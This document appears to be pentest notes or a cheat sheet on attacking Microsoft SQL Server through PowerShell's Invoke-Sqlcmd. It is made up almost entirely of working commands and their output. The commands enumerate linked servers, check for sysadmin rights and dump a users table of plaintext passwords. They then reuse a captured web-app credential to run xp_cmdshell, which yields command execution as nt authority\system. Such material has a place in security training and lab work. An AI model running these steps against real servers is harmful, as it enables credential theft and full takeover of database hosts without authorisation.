PowerShell has a built in Invoke-Sqlcmd tool
```
Invoke-Sqlcmd -ServerInstance "192.168.xxx.140" -Query "SELECT name, data_source FROM sys.servers"
```
```
name             data_source
----             -----------
SQL11\SQLEXPRESS SQL11\SQLEXPRESS
SQL27            SQL27
SQL53            SQL53
```
```
Invoke-Sqlcmd -ServerInstance "192.168.178.140" -Query "EXEC sp_linkedservers"
```
```
SRV_NAME           : SQL11\SQLEXPRESS
SRV_PROVIDERNAME   : SQLNCLI
SRV_PRODUCT        : SQL Server
SRV_DATASOURCE     : SQL11\SQLEXPRESS
SRV_NAME           : SQL27
SRV_PROVIDERNAME   : SQLNCLI
SRV_PRODUCT        : SQL Server
SRV_DATASOURCE     : SQL27
SRV_NAME           : SQL53
SRV_PROVIDERNAME   : SQLNCLI
SRV_PRODUCT        : SQL Server
SRV_DATASOURCE     : SQL53
```
```
Invoke-Sqlcmd -ServerInstance "192.168.178.140" -Query "SELECT IS_SRVROLEMEMBER('sysadmin')"
```
If 1, you are `sysadmin`.
Dump databases:
```
Invoke-Sqlcmd -ServerInstance "192.168.178.140" -Query "SELECT name FROM master.dbo.sysdatabases"
```
```
name
----
master
tempdb
model
msdb
music
```
Dump tables:
```
Invoke-Sqlcmd -ServerInstance "192.168.178.140" -Query "USE music; SELECT * FROM users"
```
```
Invoke-Sqlcmd -ServerInstance "192.168.178.140" -Query "USE music; SELECT name, pass FROM users"
```
```
name  pass
----  ----
alice password
brett mypassword
peter 123pass123
eric  123pass123
admin dfdg34fdsf3
```
alice
brett
peter
eric
admin
password
mypassword
123pass123
123pass123
dfdg34fdsf3
```
Invoke-Sqlcmd -ServerInstance "SQL11" -Database "master" -Username "webapp11" -Password "89543dfGDFGH4d" -Query "SELECT IS_SRVROLEMEMBER('sysadmin');"
```
`1`
```
Invoke-Sqlcmd -ServerInstance "SQL11" -Database "master" -Username "webapp11" -Password "89543dfGDFGH4d" -Query "EXEC sp_linkedservers;"
```
```
SRV_NAME           : SQL11\SQLEXPRESS
SRV_PROVIDERNAME   : SQLNCLI
SRV_PRODUCT        : SQL Server
SRV_DATASOURCE     : SQL11\SQLEXPRESS
SRV_NAME           : SQL27
SRV_PROVIDERNAME   : SQLNCLI
SRV_PRODUCT        : SQL Server
SRV_DATASOURCE     : SQL27
SRV_NAME           : SQL53
SRV_PROVIDERNAME   : SQLNCLI
SRV_PRODUCT        : SQL Server
SRV_DATASOURCE     : SQL53
```
```
Invoke-Sqlcmd -ServerInstance "SQL11" -Database "master" -Username "webapp11" -Password "89543dfGDFGH4d" -Query "EXEC xp_cmdshell 'whoami';"
```
```
Output
------
nt authority\system
```